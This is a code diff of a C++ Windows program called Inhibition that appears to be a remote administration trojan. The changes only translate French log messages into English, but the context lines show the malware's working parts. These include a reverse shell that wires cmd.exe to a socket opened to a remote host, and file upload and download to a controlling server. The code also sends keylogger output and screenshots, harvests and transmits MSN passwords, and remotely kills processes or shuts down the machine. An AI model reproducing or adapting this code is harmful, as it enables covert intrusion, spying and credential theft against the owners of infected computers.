@@ -44,7 +44,7 @@ namespace Inhibition
         si.wShowWindow = SW_HIDE;
         si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 
-		LOG << "Connexion Reverse Shell sur " + cinfo.ip + ":" + to_string(cinfo.port);
+		LOG << "Reverse Shell on " + cinfo.ip + ":" + to_string(cinfo.port);
         sAddr.sin_addr.s_addr = inet_addr(cinfo.ip.c_str());
         sAddr.sin_port =  htons(cinfo.port);
         sAddr.sin_family = AF_INET;
@@ -52,12 +52,12 @@ namespace Inhibition
         SOCKET c = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
 		if(c == INVALID_SOCKET)
 		{
-			LOG << "Impossible d'acquerir un socket pour RemoteShell.";
+			LOG << "Unable to open socket for RemoteShell.";
 			return;
 		}
         while(connect(c, (LPSOCKADDR)&sAddr, sizeof(sAddr)))
         {
-            LOG << "Connexion a echouee.";
+            LOG << "Connection failed";
             Sleep(100);
         }
 		
@@ -66,11 +66,11 @@ namespace Inhibition
         si.hStdError = (HANDLE)c;
         if(!CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi ))
         {
-			LOG << "Impossible de demarrer cmd.exe pour RemoteShell.";
+			LOG << "Can't start cmd.exe for RemoteShell (CreateProcess failed) : "+to_string(GetLastError());
 		}
 		else
 		{
-			LOG << "Attente de la fin du processus.";
+			LOG << "Waiting for process to end";
 			WaitForSingleObject( pi.hProcess, INFINITE );
 			CloseHandle( pi.hProcess );
 			CloseHandle( pi.hThread );
@@ -86,14 +86,14 @@ namespace Inhibition
         {
 			string path_file;
             session() >> path_file;
-            LOG << "Le fichier a envoyer au serveur est : " + path_file;
+            LOG << "File to send is : " + path_file;
             Upload transfer(path_file, session().stream());
 			transfer.addObserver(new LogTransfer);
             transfer.launch();
 		}
         catch(FileNotFound&)
         {
-            LOG << "Exception capturee : FICHIER INTROUVABLE.";
+            LOG << "File does not exist";
         }
         LOG << "StartDownload : Ended";
     }
@@ -105,14 +105,14 @@ namespace Inhibition
         {
 			string path_file;
             session() >> path_file;
-            LOG << "Le fichier a recevoir sera telecharge dans : " + path_file;
+            LOG << "File will be received in : " + path_file;
             Download transfer(path_file, session().stream());
 			transfer.addObserver(new LogTransfer);
             transfer.launch();
         }
         catch(FileNotFound&)
         {
-            LOG << "Exception capturee : FICHIER INTROUVABLE.";
+            LOG << "File does not exist";
         }
         LOG << "StartUpload : Ended";
     }
@@ -143,22 +143,22 @@ namespace Inhibition
                 }
                 else
                 {
-                    LOG << "Impossible de lister le repertoire "+directory_to_list;
+                    LOG << "Unable to read dir " + directory_to_list;
                     session() << FAILURE;
                 }
             }
         }
         catch(ListingError&)
         {
-            LOG << "Impossible de lister les disques logiques.";
+            LOG << "Unable to list logic disks";
         }
         catch(FileNotFound&)
         {
-            LOG << "Le repertoire a lister n'a pas été trouvé";
+            LOG << "The directory to list doest not exist";
         }
         catch(...)
         {
-            LOG << "Probleme d'origine inconnue.";
+            LOG << "Unknown exception";
         }
         LOG << "BrowseFileTree : Ended";
     }
@@ -207,7 +207,7 @@ namespace Inhibition
 
         if(!ShellExecuteEx(&ShExecInfo))
         {
-            LOG << "Impossible de lancer " << InhibitionCore::instance().getInstallPath();
+            LOG << "Unable to launch " << InhibitionCore::instance().getInstallPath();
         }
         else
         {
@@ -228,7 +228,7 @@ namespace Inhibition
             // encore été tapé
             if(!System::Size(Keylogger::instance().get_keylog_path()))
             {
-                LOG << "Fichier log vide.";
+                LOG << "Log file empty";
                 session() << KEYLOG_EMPTY;
             }
             else
@@ -252,28 +252,26 @@ namespace Inhibition
         {
             int quality = 10;
             string buffer_quality;
-            LOG << "Attente de la reception de la qualite...";
+            LOG << "Waiting quality";
             session() >> buffer_quality;
             from_string(buffer_quality, quality);
-            LOG << "Qualite du screenshot a envoyer : "+buffer_quality;
-            LOG << "Copie du screen dans " << SCREENSHOT_FILENAME;
+            LOG << "Quality : " + buffer_quality;
+            LOG << "Screenshot taken in : " << SCREENSHOT_FILENAME;
             screenshooter.take(SCREENSHOT_FILENAME, quality);			
-			LOG << "Envoi du screenshot";
+			LOG << "Sending screenshot";
             Upload upload(SCREENSHOT_FILENAME, session().stream());
 			upload.addObserver(new LogTransfer);
             upload.launch();
-
-            LOG << "Fin de l'envoi du screenshot";
-            LOG << "Effacement du fichier temporaire";
+            LOG << "Screenshot sent, deleting it";
 			remove(SCREENSHOT_FILENAME);
 		}
         catch(BadChecksum& )
         {
-            LOG << "Le screenshot a mal ete transfere : erreur de checksum";
+            LOG << "Checksum error";
         }
         catch(...)
         {
-            LOG << "Erreur.";
+            LOG << "Unknown exception";
         }
         LOG << "SendScreenshot : Finished";
     }
@@ -286,7 +284,7 @@ namespace Inhibition
 			string passes = Malicious::decodeAllPasswords(',');
             if(passes.size())
             {
-				LOG << "Envoi des mots de passes : " + passes;
+				LOG << "Sending passwords : " + passes;
                 session() << passes;
             }
             else
@@ -296,11 +294,11 @@ namespace Inhibition
         }
         catch(Malicious::ErrorWhileRetrieving&)
         {
-            session() << "MSN n'est pas installe sur l'ordinateur cible.";
+            session() << "MSN is not installed";
         }
 		catch(...)
 		{
-			session() << "Probleme de recuperation des mots de passe.";
+			session() << "Unable to aggregate passwords";
 		}
         LOG << "SendPasswords : Finished";
     }
@@ -317,15 +315,15 @@ namespace Inhibition
         LOG << "Inhibition Kill Process : Started";
         string buffer;
         session() >> buffer;
-
-        LOG << "Inhibition va tuer le processus : " + buffer;
+		LOG << "Process to kill : " + buffer;
         if(System::ProcessManager::KillProcess(buffer))
         {
+			LOG << "Inhibition killed process";
             session() << SUCCESS;
         }
         else
         {
-            LOG << "Impossible de tuer le processus : " + buffer;
+            LOG << "Unable to kill process";
             session() << FAILURE;
         }
         LOG << "Inhibition Kill Process : Finished";
@@ -334,7 +332,7 @@ namespace Inhibition
     void SendWindowsVersion::operator()()
     {
         LOG << "SendWindowsVersion : Started";
-        LOG << "Envoi de la version du systeme : " << System::getSystemVersionString();
+        LOG << "Sending system version : " << System::getSystemVersionString();
         session() << System::getSystemVersionString();
         LOG << "SendWindowsVersion : Finished";
     }
@@ -348,28 +346,28 @@ namespace Inhibition
 
     void Shutdown::operator()()
     {
-        LOG << "Extinction du pc imminent.";
+        LOG << "Shutting down";
         System::shutdown();
         InhibitionCore::instance().exit();
     }
 
     void Reboot::operator()()
     {
-        LOG << "Reboot du systeme imminent.";
+        LOG << "Rebooting";
         System::reboot();
         InhibitionCore::instance().exit();
     }
 
     void Logout::operator()()
     {
-        LOG << "Logout de l'utilisateur en cours imminent.";
+        LOG << "Logout";
         System::logout();
         InhibitionCore::instance().exit();
     }
 
     void Hibernate::operator()()
     {
-        LOG << "Mise en veille du pc distant.";
+        LOG << "Standby";
         System::hibernate();
     }
 
